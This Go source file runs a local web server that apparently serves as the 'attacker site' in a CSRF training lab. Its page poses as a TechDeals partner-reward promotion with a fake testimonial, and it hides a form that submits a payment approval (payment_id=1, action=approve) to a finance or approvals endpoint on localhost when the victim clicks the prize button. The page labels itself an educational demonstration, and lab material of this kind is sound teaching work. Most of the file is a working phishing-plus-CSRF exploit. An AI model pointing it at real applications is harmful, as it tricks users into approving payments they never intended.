package main

import (
	"fmt"
	"log"
	"net/http"
)

// Malicious CSRF Server - Simulates external attacker site
func maliciousCSRFHandler(w http.ResponseWriter, r *http.Request) {
	// Determine target endpoint based on 'target' parameter
	target := r.URL.Query().Get("target")
	var actionURL string
	
	switch target {
	case "legacy":
		actionURL = "http://localhost:8080/finance"
	case "modern":
		actionURL = "http://localhost:8080/approvals"
	default:
		// Default to legacy for backward compatibility
		actionURL = "http://localhost:8080/finance"
	}

	tmpl := `
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>TechDeals Partner Portal</title>
    <style>
        body { 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            margin: 0; 
            background: linear-gradient(135deg, #ff7b7b 0%%, #ff6b9d 100%%);
            min-height: 100vh;
        }
        .header {
            background: rgba(255,255,255,0.95);
            padding: 20px;
            text-align: center;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
        }
        .header-content {
            max-width: 1200px;
            margin: 0 auto;
        }
        .logo {
            font-size: 36px;
            font-weight: bold;
            color: #333;
            margin-bottom: 10px;
        }
        .container {
            max-width: 1200px;
            margin: 50px auto;
            padding: 40px;
            background: rgba(255,255,255,0.9);
            border-radius: 15px;
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            text-align: center;
        }
        .prize-box {
            background: linear-gradient(45deg, #ffd700, #ffed4e);
            padding: 30px;
            border-radius: 15px;
            margin: 30px 0;
            border: 3px solid #f39c12;
        }
        .prize-title {
            font-size: 32px;
            font-weight: bold;
            color: #e67e22;
            margin-bottom: 15px;
        }
        .prize-btn {
            background: linear-gradient(45deg, #ff6b9d, #ff8a80);
            color: white;
            padding: 20px 40px;
            border: none;
            border-radius: 50px;
            font-size: 20px;
            font-weight: bold;
            cursor: pointer;
            box-shadow: 0 10px 25px rgba(255,107,157,0.3);
            transition: transform 0.3s;
        }
        .prize-btn:hover {
            transform: translateY(-3px);
            box-shadow: 0 15px 35px rgba(255,107,157,0.4);
        }
        .hidden-form { display: none; }
        .features {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-top: 30px;
        }
        .feature {
            background: rgba(255,255,255,0.9);
            padding: 25px;
            border-radius: 10px;
            text-align: center;
        }
        .feature-icon { 
            font-size: 24px; 
            margin-bottom: 15px; 
            font-weight: bold;
            color: #333;
        }
        .testimonial {
            background: rgba(255,255,255,0.9);
            padding: 25px;
            border-radius: 10px;
            margin-top: 30px;
            text-align: center;
        }
        .back-link {
            position: fixed;
            top: 20px;
            left: 20px;
            background: rgba(255,255,255,0.9);
            padding: 10px 15px;
            border-radius: 5px;
            text-decoration: none;
            color: #333;
        }
        .warning {
            background: #ff6b6b;
            color: white;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-weight: bold;
        }
    </style>
</head>
<body>
    <a href="javascript:history.back()" class="back-link">Back</a>
    
    <div class="header">
        <div class="header-content">
            <div class="logo">TechDeals</div>
            <div style="color: #666;">Premium Partner Rewards</div>
        </div>
    </div>

    <div class="container">
        <div class="warning">
            ⚠️ EDUCATIONAL DEMONSTRATION - This is a simulated malicious site for CSRF testing
        </div>
        
        <h1>Congratulations, Globomantics Partner!</h1>
        
        <div class="prize-box">
            <div class="prize-title">Exclusive Reward Available!</div>
            <p style="font-size: 18px; color: #8b4513;">
                You've been selected for our premium partner program!<br>
                Claim your technology discount worth up to $500!
            </p>
        </div>

        <p style="color: #888; font-size: 18px; margin: 30px 0;">
            As a valued Globomantics partner, you qualify for our special promotion.
            Click below to claim your exclusive technology discount worth up to $500!
        </p>
        
        <button class="prize-btn" onclick="document.getElementById('partner-form').submit();">
            Claim Your Reward Now!
        </button>

        <!-- Hidden form that attempts CSRF attack -->
        <form id="partner-form" class="hidden-form" action="%s" method="post">
            <input type="hidden" name="payment_id" value="1">
            <input type="hidden" name="action" value="approve">
        </form>

        <p style="color: #999; font-size: 14px; margin-top: 20px;">
            * Limited time offer. Valid for Globomantics partners only.
        </p>
    </div>

    <div class="container">
        <div class="features">
            <div class="feature">
                <div class="feature-icon">Tech</div>
                <h3>Tech Equipment</h3>
                <p>Up to 40%% off laptops, tablets, and professional equipment</p>
            </div>
            
            <div class="feature">
                <div class="feature-icon">Tools</div>
                <h3>Software Licenses</h3>
                <p>Exclusive discounts on enterprise software and development tools</p>
            </div>
            
            <div class="feature">
                <div class="feature-icon">Support</div>
                <h3>Priority Support</h3>
                <p>Fast-track customer service and dedicated account management</p>
            </div>
        </div>

        <div class="testimonial">
            <h3>"Amazing savings for our business!"</h3>
            <p style="color: #666; font-style: italic;">
                "TechDeals helped us save thousands on our IT infrastructure upgrade. 
                The partner program is incredibly valuable."
            </p>
            <p style="color: #888; font-size: 14px;">— Sarah M., IT Director</p>
        </div>
    </div>

    <script>
        // Add some excitement with animations
        setTimeout(() => {
            document.querySelector('.prize-btn').style.animation = 'pulse 2s infinite';
        }, 2000);
        
        // Create pulse animation
        const style = document.createElement('style');
        style.textContent = '@keyframes pulse { 0%% { transform: scale(1); } 50%% { transform: scale(1.05); } 100%% { transform: scale(1); } }';
        document.head.appendChild(style);
    </script>
</body>
</html>`

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	w.Write([]byte(fmt.Sprintf(tmpl, actionURL)))
}

func main() {
	// Set up routes for malicious server
	http.HandleFunc("/", maliciousCSRFHandler)
	http.HandleFunc("/partners", maliciousCSRFHandler)

	fmt.Println("🚨 Malicious CSRF Server starting on http://localhost:9999")
	fmt.Println("📚 Educational Use Only - Simulates external attacker site")
	fmt.Println("")
	fmt.Println("Usage:")
	fmt.Println("  Legacy Target:  http://localhost:9999/partners?target=legacy")
	fmt.Println("  Modern Target:  http://localhost:9999/partners?target=modern")
	fmt.Println("  Default:        http://localhost:9999/partners")
	fmt.Println("")
	
	log.Fatal(http.ListenAndServe(":9999", nil))
}
